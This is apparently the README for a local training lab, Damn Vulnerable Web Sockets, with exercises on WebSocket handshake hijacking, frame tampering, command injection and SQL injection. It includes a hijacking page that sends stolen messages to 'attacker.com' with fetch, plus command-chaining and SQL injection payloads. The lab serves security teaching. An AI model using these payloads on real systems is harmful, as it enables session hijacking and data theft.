# Damn Vulnerable Web Sockets (DVWS) Lab

## Overview
**DVWS (Damn Vulnerable Web Sockets)** is a vulnerable web application designed to demonstrate security vulnerabilities specific to the WebSocket protocol (RFC 6455).

Unlike traditional stateless HTTP request-response communication, WebSockets establish a persistent, bidirectional full-duplex TCP channel initiated via an HTTP `Upgrade` handshake. Because intermediate web application firewalls (WAFs), reverse proxies, and session management schemes often fail to inspect WebSocket frames, standard vulnerabilities (XSS, SQLi, Command Injection, CSRF) can manifest in non-traditional, stealthy ways.

- **Web Application URL**: `http://localhost:8102`
- **WebSocket Gateway URL**: `ws://localhost:8103` (or proxied via the application interface)
- **Container Name**: `cyberlab_web_dvws`
- **Shortcut**: `./lab start dvws`
- **Directory**: `Classes/02_web_penetration_tester/15_websockets/dvws`

---

## Objectives & Core Learning Areas

1. **WebSocket Handshake Hijacking (CSWSH)**: Exploit missing CSRF tokens and lax `Origin` header validation during the HTTP Upgrade request to hijack active user WebSocket connections.
2. **WebSocket Frame Tampering**: Intercept and manipulate WebSocket data frames in-flight using proxy tools such as Burp Suite.
3. **Command Injection over WebSockets**: Inject shell operators and payloads into real-time interactive JSON/text WebSocket frames.
4. **SQL Injection over WebSockets**: Execute boolean, error-based, and UNION SQL injection via WebSocket queries that bypass standard HTTP request loggers.
5. **Real-time Stored & Reflected XSS**: Inject client-side execution payloads that propagate instantly across all connected WebSocket clients.

---

## Step-by-Step Exploit Exercises

### Exercise 1: WebSocket Handshake Inspection & Handshake Manipulation
1. Start the lab:
   ```bash
   ./lab start dvws
   ```
2. Open `http://localhost:8102` in your browser and log into the application.
3. Configure your browser to proxy traffic through Burp Suite (`127.0.0.1:8080`).
4. In Burp Suite, open **Proxy -> HTTP history** and inspect the handshake request that initiates the WebSocket channel:
   ```http
   GET /ws HTTP/1.1
   Host: localhost:8102
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   Sec-WebSocket-Version: 13
   Origin: http://localhost:8102
   Cookie: session=...
   ```
5. Test Handshake Tampering:
   - Send the handshake request to **Repeater**.
   - Modify or strip the `Origin` header to test if the backend server enforces strict origin checks.
   - If the server accepts `Origin: https://evil-attacker.com`, the endpoint is vulnerable to Cross-Site WebSocket Hijacking (CSWSH).

---

### Exercise 2: Cross-Site WebSocket Hijacking (CSWSH)
1. Since the WebSocket handshake relies solely on browser cookies for authentication without CSRF tokens, an external malicious site can open a WebSocket to `ws://localhost:8103` using the victim's authenticated session.
2. Create an attacker HTML payload:
   ```html
   <!DOCTYPE html>
   <html>
   <head><title>CSWSH Exploit</title></head>
   <body>
     <h1>CSRF over WebSocket Proof of Concept</h1>
     <script>
       const ws = new WebSocket('ws://localhost:8103/chat');
       ws.onopen = function() {
         // Send authenticated command or request private messages
         ws.send(JSON.stringify({"action": "get_messages"}));
       };
       ws.onmessage = function(event) {
         // Exfiltrate stolen data to attacker listener
         fetch('http://attacker.com/log?stolen=' + encodeURIComponent(event.data));
       };
     </script>
   </body>
   </html>
   ```
3. When the logged-in victim visits the attacker's page, the browser initiates the WebSocket connection, transmits the session cookie, and allows the attacker to read real-time confidential messages.

---

### Exercise 3: Frame Tampering & Interception in Burp Suite
1. Navigate to the chat or message exchange interface in DVWS.
2. In Burp Suite, navigate to **Proxy -> WebSockets history**.
3. Notice each incoming and outgoing message frame displayed with direction (`to client` vs `to server`).
4. Enable **Proxy -> Intercept -> Intercept WebSockets Messages**.
5. Type a message in the DVWS chat and click Send.
6. The outbound WebSocket frame is captured in Burp:
   ```json
   {"user": "guest", "message": "Hello world", "role": "user"}
   ```
7. Tamper with the frame attributes prior to forwarding:
   - Change `"role": "user"` to `"role": "admin"`.
   - Forward the modified frame to bypass client-side role validation.

---

### Exercise 4: Command Injection via WebSocket Frames
1. Locate the Network Diagnostic / Ping utility inside DVWS.
2. Input an IP address (e.g., `127.0.0.1`) and monitor the WebSocket frame sent to the server:
   ```json
   {"action": "ping", "target": "127.0.0.1"}
   ```
3. Modify the target parameter to append command chaining syntax:
   ```json
   {"action": "ping", "target": "127.0.0.1; whoami; id"}
   ```
4. Observe the response frame received from the server reflecting the output of the executed operating system command.

---

### Exercise 5: SQL Injection over WebSockets
1. Navigate to the user lookup or search function powered by WebSockets.
2. Submit a search query and intercept the outgoing WebSocket frame:
   ```json
   {"query": "admin"}
   ```
3. Inject standard SQL injection payloads directly into the JSON string:
   ```json
   {"query": "admin' OR 1=1--"}
   ```
4. Observe that the database returns all table rows inside the response WebSocket frame, proving that WAF rules inspecting only HTTP `GET`/`POST` query strings fail to analyze WebSocket payloads.

---

## YouTube Walkthroughs & Solving Guides

- [Manipulating WebSocket handshakes with Burp Suite](https://www.youtube.com/watch?v=NJ2TM4-id2w)
- [Manipulating WebSocket messages with Burp Suite](https://www.youtube.com/watch?v=Wcd1Lskvj4c)
- [How to test WebSockets with Burp Suite](https://www.youtube.com/watch?v=KbaOay1yOH0)
- [Lab: Cross-Site WebSocket Hijacking (CSWSH)](https://www.youtube.com/watch?v=U_z2OCAkoLk)
- [PortSwigger WebSockets: Manipulating WebSocket Messages](https://www.youtube.com/watch?v=DWnTxHpA61I)
- [Cross-Site WebSocket Hijacking (Technical Explanation)](https://www.youtube.com/watch?v=lrPPMDNpgdY)

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Start DVWS
./lab start dvws

# Check running status
./lab status

# Enter container shell
./lab shell dvws

# Stop the lab
./lab stop dvws
```
